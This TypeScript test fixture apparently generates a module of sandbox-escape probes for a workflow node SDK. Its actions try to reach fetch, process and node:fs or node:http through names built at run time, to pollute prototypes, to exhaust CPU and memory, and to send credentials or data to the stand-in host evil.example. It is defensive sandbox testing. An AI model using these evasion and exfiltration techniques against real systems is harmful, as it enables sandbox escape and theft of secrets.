import { GUEST_LACKS } from '../pack';

/**
 * The source of a module with one action per probe of the sandbox: escapes, host checks and
 * guest features. `sandbox.test.ts` and `scripts/runtime-matrix.ts` pack its exports. A request
 * to `canary` shows that the bundle reached the network.
 */
export const escapeProbes = (canary: string) => `import { defineNode, t } from '@n8n/node-sdk';
import { compat, credential, defineCredential, field } from '@n8n/node-sdk/credentials';
const { binary, obj, str } = t;
const probe = defineNode({ id: 'probe', displayName: 'Probe' });
const acmeToken = defineCredential({
	id: 'acme.token',
	legacyName: 'acmeApi',
	displayName: 'Acme API',
	fields: { account: field.text('Account ID'), apiKey: field.secret('API Key') },
	baseUrl: 'https://api.acme.test',
	auth: (a) => a.bearer('apiKey'),
});
const acme = defineNode({ id: 'acme', displayName: 'Acme', credential: credential({ types: [acmeToken] }) });
const slackApi = compat('slackApi', { hosts: ['evil.example'] });
const thief = defineNode({
	id: 'thief',
	displayName: 'Thief',
	credential: credential({ types: [slackApi] }),
});
const baseThief = defineNode({
	id: 'baseThief',
	displayName: 'Base Thief',
	baseUrl: 'https://evil.example',
	credential: credential({ types: [slackApi] }),
});
const spec = (run: (context: any) => Promise<unknown>, extra: Record<string, unknown> = {}, node: any = probe) =>
	node.action('probe', {
		action: 'Probe',
		summary: 'Probe the sandbox.',
		flow: { effect: 'read', cardinality: 'per-item' },
		input: {},
		output: obj({ value: str() }),
		...extra,
		run,
	} as any);
const canary = '${canary}';
// Names built at run time pass the pack check, so the sandbox must stop them.
export const fetchProbe = spec(async () => ({ value: String(await (globalThis as any)[['fet', 'ch'].join('')](canary)) }));
export const processProbe = spec(async () => ({ value: String((globalThis as any)[['pro', 'cess'].join('')].env.SANDBOX_CANARY) }));
// String() of a module namespace throws, which would hide an import that worked.
export const importProbe = spec(async () => ({ value: Object.keys(await import(['node', 'fs'].join(':'))).join(',') }));
// Real Node gives the bundle a process object, so its builtins reach the network past the guest shims.
export const builtinNetProbe = spec(async () => {
	const http = (globalThis as any)[['pro', 'cess'].join('')].getBuiltinModule(['node', 'http'].join(':'));
	const value = await new Promise<string>((resolve, reject) =>
		http.get(canary, (response: any) => response.resume().on('end', () => resolve('reached'))).on('error', reject),
	);
	return { value };
});
export const globalsProbe = spec(async () => ({
	value: JSON.stringify(${JSON.stringify(GUEST_LACKS)}.filter((name) => name in globalThis)),
}));
export const timerProbe = spec(async ({ http }) => {
	(globalThis as any)[['set', 'Timeout'].join('')](() => void http.request({ url: canary }), 0);
	return { value: 'scheduled' };
});
export const loopProbe = spec(async () => {
	for (;;) {}
});
export const memoryProbe = spec(async () => {
	const kept: unknown[] = [];
	for (;;) kept.push(new Array(1_000_000).fill(kept.length));
});
export const undeclaredProbe = spec(async (context) => ({
	value: String(await context.dataTables.open({ name: 'secrets' })),
}));
export const egressProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['api.example.com'] } },
);
export const inputUrlProbe = spec(
	async ({ input, http }) => ({ value: String(await http.request({ url: input.url })) }),
	{ egress: { fromInput: 'url' }, input: { url: str() } },
);
export const noEgressProbe = spec(async ({ http }) => ({
	value: String(await http.request({ url: 'https://api.example.com/steal' })),
}));
export const credentialHostProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['evil.example'] } },
	thief,
);
export const baseUrlProbe = spec(async ({ http }) => ({ value: String(await http.request({ path: '/steal' })) }), {}, baseThief);
export const pollutionProbe = spec(async () => {
	(Object.prototype as any).polluted = 'yes';
	return { value: String(({} as any).polluted) };
});
export const randomProbe = spec(async () => ({
	value: [Math.random(), crypto.getRandomValues(new Uint32Array(2)).join('-'), crypto.randomUUID()].join(' '),
}));
export const clockProbe = spec(async ({ http }) => {
	const before = [Date.now(), performance.now()];
	await http.request({ url: 'https://api.example.com/clock' });
	const after = [Date.now(), performance.now()];
	return { value: JSON.stringify({ before, after }) };
}, { egress: { hosts: ['api.example.com'] } });
export const echoProbe = spec(async ({ http }) => ({
	value: JSON.stringify(await http.request({ url: 'https://api.example.com/echo', fullResponse: true })),
}), { egress: { hosts: ['api.example.com'] } });
export const failureProbe = spec(async ({ http }) => {
	try {
		return { value: String(await http.request({ url: 'https://api.example.com/missing' })) };
	} catch (error) {
		return { value: JSON.stringify(error.headers) };
	}
}, { egress: { hosts: ['api.example.com'] } });
export const canaryProbe = spec(
	async ({ input, http }) => ({
		value: JSON.stringify(await http.request({ method: 'POST', url: 'https://api.acme.test/echo', body: { note: input.note } })),
	}),
	{ egress: { hosts: ['api.acme.test'] }, input: { note: str() } },
	acme,
);
export const credentialProbe = spec(async ({ credential }) => ({ value: JSON.stringify(credential) }), {}, acme);
export const credentialErrorProbe = spec(async (context) => {
	try {
		return { value: JSON.stringify(context.credential) };
	} catch (error) {
		return { value: String(error.message) };
	}
}, {}, acme);
export const binaryProbe = spec(
	async ({ input, http, binary: files }) => {
		const chunks: Uint8Array[] = [];
		for await (const chunk of input.file.read()) chunks.push(chunk);
		const copy = await files.create({ mimeType: 'application/octet-stream', fileName: 'copy.bin' }, chunks);
		const sent = await http.request({ method: 'POST', url: 'https://api.example.com/upload', body: copy });
		const fetched = await http.request({ url: 'https://api.example.com/file', response: 'binary' });
		const size = chunks.reduce((sum, chunk) => sum + chunk.length, 0);
		const value = JSON.stringify({ size, chunks: chunks.length, meta: input.file.meta, sent, fetched: fetched.meta });
		return { value, copy, fetched };
	},
	{
		input: { file: binary() },
		output: obj({ value: str(), copy: binary(), fetched: binary() }),
		egress: { hosts: ['api.example.com'] },
	},
);
export const parsersProbe = spec(
	async ({ input, parsers }) => ({
		value: JSON.stringify(await parsers.extract(input.file, 'csv', { delimiter: ';', header: false })),
	}),
	{ input: { file: binary() }, imports: ['parsers'] },
);
export const migrateProbe = spec(async ({ input }) => ({ value: input.message }), {
	version: '2.0.0',
	input: { message: str() },
	migrate: (fromMajor: number, params: any) => ({ message: String(params.text) }),
});
export const openStreamsProbe = spec(
	async ({ input, binary: files }) => {
		for await (const _chunk of input.file.read()) break;
		const failing = async function* () {
			yield 'part';
			throw new Error('chunks failed');
		};
		await files.create({ mimeType: 'text/plain' }, failing()).catch(() => undefined);
		return { value: 'done' };
	},
	{ input: { file: binary() } },
);
`;
